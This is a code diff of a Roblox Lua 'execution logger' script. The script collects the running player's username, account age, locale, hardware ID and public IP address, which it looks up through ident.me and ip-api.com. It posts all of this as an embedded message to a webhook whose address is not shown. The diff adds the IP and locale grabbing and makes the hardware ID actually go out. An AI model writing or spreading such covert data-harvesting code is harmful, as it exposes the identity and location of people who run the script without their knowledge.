@@ -14,6 +14,8 @@ local DisplayName = LocalPlayer.DisplayName
 local Username = LocalPlayer.Name
 local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
 local AccountAge = LocalPlayer.AccountAge
+local Country = LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
 local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
 local Hwid = RbxAnalyticsService:GetClientId()
 local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
@@ -44,6 +46,7 @@ local http_request = request(
 		["Content-Type"] = "application/json"
 	},
 	Body = HttpService:JSONEncode({
+		username = "enzoe15226 execution logger",
 		content = "",
         embeds = {
             {
@@ -62,7 +65,7 @@ local http_request = request(
             {
                 title = "Roblox Hwid",
                 description = string.format(
-                    "**HWID:**",
+                    "**HWID:** `%s`",
                     Hwid
                 ),
                 color = tonumber("0xe74c3c")
@@ -79,6 +82,6 @@ local http_request = request(
                 }
             }
         }
-})
-}
+	}
 )
+})
